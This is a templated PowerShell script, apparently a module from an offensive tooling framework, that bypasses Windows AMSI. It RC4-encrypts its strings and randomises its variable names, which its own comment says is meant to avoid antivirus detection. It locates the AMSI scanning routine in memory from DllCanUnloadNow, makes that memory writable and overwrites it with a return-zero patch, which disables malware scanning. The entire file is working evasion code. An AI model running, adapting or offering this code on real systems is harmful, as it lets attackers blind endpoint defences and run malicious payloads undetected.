{# https://www.contextis.com/en/blog/amsi-bypass #}
{# Obfuscated to avoid AV detection #}
{# Credits: @am0nsec #}

{% set strings = [
    '''
    using System;
    using System.Runtime.InteropServices;
    public class Kernel32 {
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr '''+symbol_name("hModule")+''', string lpProcName);
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
''',
    "amsi.dll",
    "DllCanUnloadNow",
] %}

{% for s in strings %}
    ${{symbol_name("am0nsec" ~ loop.index)}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}";
{% endfor %}

${{symbol_name("am0nsecb1")}} = {{symbol_name("Decrypt-String")}} {{"4C8BDC49895B0849896B104989731857415641574883EC70"|rc4byteencrypt}};
${{symbol_name("am0nsecb2")}} = {{symbol_name("Decrypt-String")}} {{"8BFF558BEC83EC185356"|rc4byteencrypt}};


Add-Type ${{symbol_name("am0nsec1")}};

Class {{symbol_name("Hunter")}} {
    static [IntPtr] FindAddress([IntPtr]${{symbol_name("address")}}, [byte[]]${{symbol_name("egg")}}) {
        while ($true) {
            [int]${{symbol_name("count")}} = 0;

            while ($true) {
                [IntPtr]${{symbol_name("address")}} = [IntPtr]::Add(${{symbol_name("address")}}, 1);
                If ([System.Runtime.InteropServices.Marshal]::ReadByte(${{symbol_name("address")}}) -eq ${{symbol_name("egg")}}.Get(${{symbol_name("count")}})) {
                    ${{symbol_name("count")}}++;
                    If (${{symbol_name("count")}} -eq ${{symbol_name("egg")}}.Length) {
                        return [IntPtr]::Subtract(${{symbol_name("address")}}, ${{symbol_name("egg")}}.Length - 1);
                    }
                } Else { break }
            }
        }

        return ${{symbol_name("address")}};
    }
}

[IntPtr]${{symbol_name("hModule")}} = [Kernel32]::LoadLibrary(${{symbol_name("am0nsec2")}});

[IntPtr]${{symbol_name("dllCanUnloadNowAddress")}} = [Kernel32]::GetProcAddress(${{symbol_name("hModule")}}, ${{symbol_name("am0nsec3")}});

If ([IntPtr]::Size -eq 8) {
    [byte[]]${{symbol_name("egg")}} = [System.Convert]::FromBase64String(${{symbol_name("am0nsecb1")}});
} Else {
    [byte[]]${{symbol_name("egg")}} = [System.Convert]::FromBase64String(${{symbol_name("am0nsecb2")}});
}
[IntPtr]${{symbol_name("targetedAddress")}} = [{{symbol_name("Hunter")}}]::FindAddress(${{symbol_name("dllCanUnloadNowAddress")}}, ${{symbol_name("egg")}});

${{symbol_name("buffer")}} = 0;
[Kernel32]::VirtualProtect(${{symbol_name("targetedAddress")}}, [uint32]2, 4, [ref]${{symbol_name("buffer")}}) | Out-Null;

${{symbol_name("patch")}} = [byte[]] (0x31, 0xC0, 0xC3);
[System.Runtime.InteropServices.Marshal]::Copy(${{symbol_name("patch")}}, 0, ${{symbol_name("targetedAddress")}}, 3);

${{symbol_name("zero")}} = 0;
[Kernel32]::VirtualProtect(${{symbol_name("targetedAddress")}}, [uint32]2, ${{symbol_name("buffer")}}, [ref]${{symbol_name("zero")}}) | Out-Null;
